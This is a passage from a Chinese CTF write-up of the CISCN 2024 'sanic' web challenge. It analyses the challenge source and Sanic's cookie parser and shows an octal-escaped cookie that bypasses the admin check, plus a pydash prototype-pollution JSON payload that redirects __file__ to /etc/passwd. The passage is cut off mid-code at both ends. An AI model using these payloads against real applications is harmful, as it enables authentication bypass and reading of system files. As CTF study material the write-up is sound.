class="code"><pre><span class="line">flag&#123;1084bd02-8273-4a0b-a490-08451805df3a&#125;</span><br></pre></td></tr></table></figure><h2 id="ciscn2024-初赛-sanic"><a class="markdownIt-Anchor" href="#ciscn2024-初赛-sanic">#</a> [Ciscn2024 初赛] sanic</h2><p>​根路由提示： where is my flag?，f12 后发现提示了 /src 路由，访问后获得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​初步审一下逻辑，有用的信息如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure><p>​一眼看上去没什么，但是和下面这个结合起来就不一样了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br></pre></td></tr></table></figure><p>​在 admin 这个路由中，可以清晰地看到 pydash.set_() 函数，结合上一个信息，应该是打 python 的原型链污染 <code>__file__</code> 来读文件，那么，还有个路由需要注意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure><p>​这里可以发现的是，我们需要传入一个 Cookie 的值为 user=adm;n 才行，但是，试过了，不行，为啥呢？</p><p><strong>注意：以下为我个人分析方式，由于我本人异常菜鸡，所以很有可能是错误的，不可盲目相信。</strong></p><p>​然后我们盯住 <code>user = request.cookies.get(&quot;user&quot;)</code>  这一行代码，对着 cookie 同时按住 ctrl + 左键，找到这一行内容，跟进：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/334caff31c114d5da4c4fd89b1523085.png#pic_center" alt="在这里插入图片描述"></p><p>​发现如下源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Incoming cookies on the request</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        RequestParameters: Incoming cookies on the request</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.parsed_cookies <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.get_cookies()</span><br><span class="line">    <span class="keyword">return</span> cast(CookieRequestParameters, self.parsed_cookies)</span><br></pre></td></tr></table></figure><p>​跟进  <code>get_cookies()</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    cookie = self.headers.getone(<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    self.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))</span><br><span class="line">    <span class="keyword">return</span> self.parsed_cookies</span><br></pre></td></tr></table></figure><p>​这里审过前面那个对象，重要程度没有再跟进 <code>parse_cookie(cookie)</code>  高，所以跟进 <code>parse_cookie(cookie)</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">raw: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses a raw cookie string into a dictionary.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The function takes a raw cookie string (usually from HTTP headers) and</span></span><br><span class="line"><span class="string">    returns a dictionary where each key is a cookie name and the value is a</span></span><br><span class="line"><span class="string">    list of values for that cookie. The function handles quoted values and</span></span><br><span class="line"><span class="string">    skips invalid cookie names.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        raw (str): The raw cookie string to be parsed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Dict[str, List[str]]: A dictionary containing the cookie names as keys</span></span><br><span class="line"><span class="string">        and a list of values for each cookie.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        raw = &#x27;name1=value1; name2=&quot;value2&quot;; name3=value3&#x27;</span></span><br><span class="line"><span class="string">        cookies = parse_cookie(raw)</span></span><br><span class="line"><span class="string">        # cookies will be &#123;&#x27;name1&#x27;: [&#x27;value1&#x27;], &#x27;name2&#x27;: [&#x27;value2&#x27;], &#x27;name3&#x27;: [&#x27;value3&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><pre><code>&quot;&quot;&quot;  # noqa: E501cookies: Dict[str, List[str]] = &#123;&#125;for token in raw.split(&quot;;&quot;):    name, sep, value = token.partition(&quot;=&quot;)    name = name.strip()    value = value.strip()    # Support cookies =value or plain value with no name    # https://github.com/httpwg/http-extensions/issues/159    if not sep:        if not name:            # Empty value like ;; or a cookie header with no value            continue        name, value = &quot;&quot;, name    if COOKIE_NAME_RESERVED_CHARS.search(name):  # no cov        continue    if len(value) &gt; 2 and value[0] == '&quot;' and value[-1] == '&quot;':  # no cov        value = _unquote(value)    if name in cookies:        cookies[name].append(value)    else:        cookies[name] = [value]return cookies</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​这里有一点需要注意：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"> for token in raw.split(&quot;;&quot;):</span><br><span class="line">        name, sep, value = token.partition(&quot;=&quot;)</span><br><span class="line">        name = name.strip()</span><br><span class="line">        value = value.strip()</span><br></pre></td></tr></table></figure><p>​这个代码很显然是将分号前后分割成了两个字符串，也就是说，我们想要输入的 Cookie: user=adm;n 会变成 user=adm 以及 n 这两个串。</p><p>​根据这几行，大概可以发现最后返回的内容和什么有关了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">2</span> <span class="keyword">and</span> value[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> value[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:  <span class="comment"># no cov</span></span><br><span class="line">        value = _unquote(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> cookies:</span><br><span class="line">        cookies[name].append(value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cookies[name] = [value]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cookies</span><br></pre></td></tr></table></figure><p>​很明显，最终返回的是 cookies ，但是每次操作 cookies 都是增加的 value 参数，由此，根据  <code>value = _unquote(value)</code> ，这里跟进 <code>_unquote(value)</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_unquote</span>(<span class="params"><span class="built_in">str</span></span>):  <span class="comment"># no cov</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">        o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        j = k = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> o_match:</span><br><span class="line">            j = o_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match:</span><br><span class="line">            k = q_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">            res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">            i = k + <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">            i = j + <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure><p>​感觉，这个就是我们最主要的利用的点。</p><p>​首先是这几行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>​判断传入的字符串（这里推测是 user=XXXX 中的 XXXX），发现如果第一个字符不是两种引号，则直接返回，如果是引号，则掐头去尾，把引号去掉。之后的代码我不大会审，跑去问了下 AI，可能有点儿智障，不过给了我一个方向，测试了一下，能成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">    o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    j = k = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> o_match:</span><br><span class="line">        j = o_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match:</span><br><span class="line">        k = q_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">        res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">        i = k + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">        i = j + <span class="number">4</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/b7ed96c33d6c4f9fa6d71c7b2a5a49d5.png#pic_center" alt="在这里插入图片描述"></p><p>​后面还给了个它给写的改进的代码，不过就不放这儿了。</p><p>​根据这个答案猜想，可能是通过八进制进行的绕过，测试一下，访问下 login 路由，然后修改 cookie 的值为 <code>Cookie: user=&quot;adm\073n&quot;</code> ，之后试试看能否登陆成功？</p><p><img data-src="https://i-blog.csdnimg.cn/direct/545cfa811fea45829bf35e9fb54f09c0.png#pic_center" alt="在这里插入图片描述"></p><p>​成功了 <strong>(≧▽≦)o</strong>。</p><p>​这里它返回了个 Session 值，然后将它给的 Session 值写到请求头内，然后访问 admin 路由，发现并没有 给我们直接 forbidden 掉，说明成功了。之后就是正儿八经的原型链污染读文件了，第一波，先读一下，先来个第一个 payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__.__globals__.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​然而，恭喜了，每过，被 forbidden 了。回去看看，破案了，admin 路由函数中存在这么一个比较： <code>if key and value and type(key) is str and '_.' not in key:</code> ，这个就卡住我了。先来看下这几行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>​似乎需要绕过的仅仅只有 key 中的  <code>'_.'</code>  字符串，那么，需要的就是对 key 进行操作的地方应该重点观察，所以，上面这个代码应该重点看一看，当然， 前面的所有都没有用，最有用的只有 <code>pydash.set_(pollute, key, value)</code> ，那么，没办法了，跟进 set_() 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, 